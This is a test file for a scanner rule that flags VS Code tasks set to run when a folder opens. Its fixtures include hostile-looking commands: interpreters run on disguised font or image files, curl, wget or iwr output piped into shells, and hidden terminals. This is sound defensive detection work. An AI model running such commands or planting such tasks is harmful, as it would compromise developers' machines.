import { describe, expect, it } from 'vitest';
import { type AutorunSettings, analyze, autorunTask } from '../../src/checks/code/autorun-task.js';
import { parseJsonc } from '../../src/checks/code/jsonc.js';
import { dedent } from '../helpers.js';

// Every fixture here is hand-written. Commands that would be dangerous point at files that don't
// exist and addresses under example domains, and none of them is ever run.

const DEFAULTS: AutorunSettings = { allowAutomaticTasks: false };

function check(jsonc: string, settings: AutorunSettings = DEFAULTS) {
  return analyze(parseJsonc(dedent(jsonc)), settings);
}

/** A tasks.json with one auto-run task built from `fields` (JSONC object members). */
function autorun(fields: string): string {
  return `{
    "version": "2.0.0",
    "tasks": [
      {
        "label": "Setup",
        ${fields},
        "runOptions": { "runOn": "folderOpen" }
      }
    ]
  }`;
}

describe('code/autorun-task', () => {
  it('flags a plain watcher that starts when the folder opens as medium', () => {
    const findings = check(`
      {
        "version": "2.0.0",
        "tasks": [
          {
            "label": "watch",
            "type": "npm",
            "script": "watch",
            "runOptions": {
              "runOn": "folderOpen"
            }
          }
        ]
      }
    `);
    expect(findings).toEqual([
      {
        ruleId: 'code/autorun-task',
        severity: 'medium',
        message: 'Task "watch" runs automatically when the folder opens.',
        subject: 'watch',
        file: '.vscode/tasks.json',
        line: 9,
        column: 9,
        remediation: expect.stringContaining('"task.allowAutomaticTasks": "off"'),
      },
    ]);
  });

  it('ignores tasks without runOn, and tasks that run on demand', () => {
    const findings = check(`
      {
        "tasks": [
          { "label": "build", "command": "npm run build" },
          { "label": "test", "command": "npm test", "runOptions": { "runOn": "default" } },
          { "label": "lint", "command": "npm run lint", "runOptions": {} }
        ]
      }
    `);
    expect(findings).toEqual([]);
  });

  it('ignores a file without a tasks list, or with an odd shape', () => {
    expect(check('{ "version": "2.0.0" }')).toEqual([]);
    expect(check('[]')).toEqual([]);
    expect(check('{ "tasks": { "label": "not a list" } }')).toEqual([]);
    expect(check('{ "tasks": [1, "two", null] }')).toEqual([]);
  });

  it('reads files with comments and trailing commas', () => {
    const findings = check(`
      // Tasks for this project
      {
        "version": "2.0.0", /* schema 2 */
        "tasks": [
          {
            "label": "dev server", // starts the dev server
            "command": "npm run dev",
            "runOptions": { "runOn": "folderOpen", },
          },
        ],
      }
    `);
    expect(findings).toEqual([
      expect.objectContaining({ severity: 'medium', subject: 'dev server', line: 8, column: 23 }),
    ]);
  });

  it('is not confused by // inside a string, such as a URL', () => {
    const findings = check(`
      {
        "tasks": [
          {
            "label": "docs", "command": "open https://example.com//docs", "runOptions": {
              "runOn": "folderOpen"
            }
          }
        ]
      }
    `);
    expect(findings).toEqual([expect.objectContaining({ severity: 'medium', line: 5, column: 9 })]);
  });

  it('reports one finding per auto-run task, each at its own runOn key', () => {
    const findings = check(`
      {
        "tasks": [
          { "label": "a", "command": "npm run a", "runOptions": { "runOn": "folderOpen" } },
          { "label": "b", "command": "npm run b" },
          { "command": "npm run c", "runOptions": { "runOn": "folderOpen" } }
        ]
      }
    `);
    expect(findings.map((f) => [f.subject, f.line, f.column])).toEqual([
      ['a', 3, 61],
      ['task 3', 5, 47],
    ]);
    expect(findings[1]?.message).toBe(
      'Task 3 (no label) runs automatically when the folder opens.',
    );
  });

  it('names an unlabelled npm task the way VS Code does', () => {
    const findings = check(`
      { "tasks": [{ "type": "npm", "script": "watch", "runOptions": { "runOn": "folderOpen" } }] }
    `);
    expect(findings[0]?.subject).toBe('npm: watch');
  });

  it('flags runOn inside a windows, osx or linux block, and says which platforms', () => {
    const findings = check(`
      {
        "tasks": [
          {
            "label": "setup",
            "command": "npm run setup",
            "windows": {
              "runOptions": { "runOn": "folderOpen" }
            },
            "linux": {
              "runOptions": { "runOn": "folderOpen" }
            },
            "osx": {
              "runOptions": { "runOn": "default" }
            }
          }
        ]
      }
    `);
    expect(findings).toEqual([
      expect.objectContaining({
        severity: 'medium',
        line: 7,
        column: 25,
        message: 'Task "setup" runs automatically when the folder opens on Windows and Linux.',
      }),
    ]);
  });

  it('reports a task once when runOn is set both on it and in a platform block', () => {
    const findings = check(`
      {
        "tasks": [
          {
            "label": "setup",
            "runOptions": { "runOn": "folderOpen" },
            "osx": { "runOptions": { "runOn": "folderOpen" } }
          }
        ]
      }
    `);
    expect(findings).toEqual([expect.objectContaining({ line: 5, column: 23 })]);
    expect(findings[0]?.message).toBe('Task "setup" runs automatically when the folder opens.');
  });

  describe('critical signals', () => {
    it.each([
      [
        'node on a .woff2 font',
        '"command": "node ./public/fonts/icons-400.woff2"',
        'runs node on a font file',
      ],
      ['node on a .woff font, given in args', '"command": "node", "args": ["x.woff"]', 'font'],
      ['bash on a .ttf font', '"command": "bash", "args": ["-x", "assets/x.ttf"]', 'bash on a'],
      ['sh on an .otf font', '"command": "sh x.otf"', 'runs sh on a font file'],
      ['python3 on a font', '"command": "python3 -u data/x.woff2"', 'runs python on a font file'],
      [
        'powershell -File on a font',
        '"command": "powershell.exe", "args": ["-ExecutionPolicy", "Bypass", "-File", "x.ttf"]',
        'runs powershell on a font file',
      ],
      ['node on an image', '"command": "node logo.png"', 'runs node on an image file'],
      [
        'node on a made-up extension',
        '"command": "node fa-solid.lkf"',
        'runs node on a ".lkf" file, which isn\'t a script',
      ],
      [
        'node after a shell separator',
        '"command": "npm install && node x.woff2"',
        'runs node on a font file',
      ],
      [
        'node inside sh -c',
        '"command": "sh", "args": ["-c", "node x.woff2"]',
        'runs node on a font file',
      ],
      [
        'node with the full path and a quoted file',
        '"command": "C:\\\\Program Files\\\\nodejs\\\\node.exe", "args": [{ "value": "x.woff2", "quoting": "strong" }]',
        'runs node on a font file',
      ],
      [
        'curl piped to bash',
        '"command": "curl -fsSL https://example.com/i.sh | bash"',
        'downloads a script and runs it in a shell',
      ],
      [
        'wget piped to sudo sh',
        '"command": "wget -qO- https://example.com/i | sudo sh"',
        'downloads a script and runs it in a shell',
      ],
      [
        'bash running curl output',
        '"command": "bash -c \\"$(curl -fsSL https://example.com/i.sh)\\""',
        'downloads a script and runs it in a shell',
      ],
      [
        'iwr piped to iex',
        '"command": "powershell", "args": ["-Command", "iwr https://example.com/a | iex"]',
        'downloads a script and runs it in a shell',
      ],
      [
        'Invoke-WebRequest piped to Invoke-Expression',
        '"command": "Invoke-WebRequest https://example.com/a | Invoke-Expression"',
        'downloads a script and runs it in a shell',
      ],
      [
        'reveal never',
        '"command": "npm run dev", "presentation": { "reveal": "never" }',
        'hides its terminal',
      ],
      [
        'echo false',
        '"command": "npm run dev", "presentation": { "echo": false }',
        "doesn't show the command it runs",
      ],
      [
        'a vercel.app /settings/ address',
        '"command": "npm run dev", "options": { "env": { "U": "https://x-1.vercel.app/api/settings/a" } }',
        'contacts a vercel.app /settings/ address',
      ],
    ])('flags %s as critical', (_, fields, signal) => {
      const [finding] = check(autorun(fields));
      expect(finding?.severity).toBe('critical');
      expect(finding?.message).toMatch(
        /^Task "Setup" runs automatically when the folder opens, and /,
      );
      expect(finding?.message).toContain(signal);
      expect(finding?.subject).toBe('Setup');
    });

    it.each([
      ['node on a script', '"command": "node scripts/watch.mjs"'],
      ['node on a folder', '"command": "node ."'],
      ['python running a module', '"command": "python -m http.server 8000"'],
      ['node -e with a font name in the code', '"command": "node", "args": ["-e", "1"]'],
      ['a font named after another program', '"command": "echo node x.woff2"'],
      ['node -r preloading a module', '"command": "node -r ts-node/register src/main.ts"'],
      ['curl without a shell', '"command": "curl -o x.json https://example.com/x.json"'],
      ['a different vercel.app path', '"command": "open https://my-app.vercel.app/docs"'],
      ['settings on a different host', '"command": "open https://example.com/settings/x"'],
      ['reveal silent', '"command": "npm run dev", "presentation": { "reveal": "silent" }'],
      ['echo true', '"command": "npm run dev", "presentation": { "echo": true }'],
    ])('keeps %s at medium', (_, fields) => {
      expect(check(autorun(fields))).toEqual([expect.objectContaining({ severity: 'medium' })]);
    });

    it('never quotes the command or the address in the message', () => {
      const [finding] = check(
        autorun(
          '"command": "curl https://x.vercel.app/settings/linux?flag=1 | bash; node x.woff2"',
        ),
      );
      expect(finding?.message).toBe(
        'Task "Setup" runs automatically when the folder opens, and runs node on a font file, ' +
          'downloads a script and runs it in a shell and contacts a vercel.app /settings/ ' +
          'address, a pattern PolinRider uses.',
      );
    });

    it('checks the command a platform block runs', () => {
      const [finding] = check(
        autorun('"command": "npm run dev", "osx": { "command": "sh x.otf" }'),
      );
      expect(finding?.message).toContain('runs sh on a font file');
    });

    it('applies presentation settings from the top of the file to tasks without their own', () => {
      const hidden = (task: string) =>
        check(`
          {
            "presentation": { "reveal": "never" },
            "tasks": [{ "label": "x", ${task} "runOptions": { "runOn": "folderOpen" } }]
          }
        `)[0]?.severity;
      expect(hidden('')).toBe('critical');
      expect(hidden('"presentation": { "reveal": "always" },')).toBe('medium');
    });
  });

  describe('task.allowAutomaticTasks', () => {
    const ON: AutorunSettings = { allowAutomaticTasks: true };

    it('raises a medium finding to high, and says why', () => {
      const [finding] = check(autorun('"command": "npm run watch"'), ON);
      expect(finding?.severity).toBe('high');
      expect(finding?.message).toBe(
        'Task "Setup" runs automatically when the folder opens. .vscode/settings.json also sets ' +
          '"task.allowAutomaticTasks" to "on", which tries to let tasks run without VS Code ' +
          'asking first.',
      );
    });

    it('leaves a critical finding critical', () => {
      const [finding] = check(autorun('"command": "node x.woff2"'), ON);
      expect(finding?.severity).toBe('critical');
      expect(finding?.message).toContain('"task.allowAutomaticTasks" to "on"');
    });
  });

  it('shortens a very long label in the message, but keeps it whole in the subject', () => {
    const label = 'x'.repeat(100);
    const [finding] = check(`
      { "tasks": [{ "label": "${label}", "runOptions": { "runOn": "folderOpen" } }] }
    `);
    expect(finding?.subject).toBe(label);
    expect(finding?.message).toBe(
      `Task "${'x'.repeat(59)}…" runs automatically when the folder opens.`,
    );
  });

  it('describes how to check the task, delete it, and turn off automatic tasks', () => {
    expect(autorunTask.remediation).toContain('"command" and "args"');
    expect(autorunTask.remediation).toContain('delete it');
    expect(autorunTask.remediation).toContain('"task.allowAutomaticTasks": "off"');
    expect(autorunTask.remediation).toContain('user settings');
  });
});
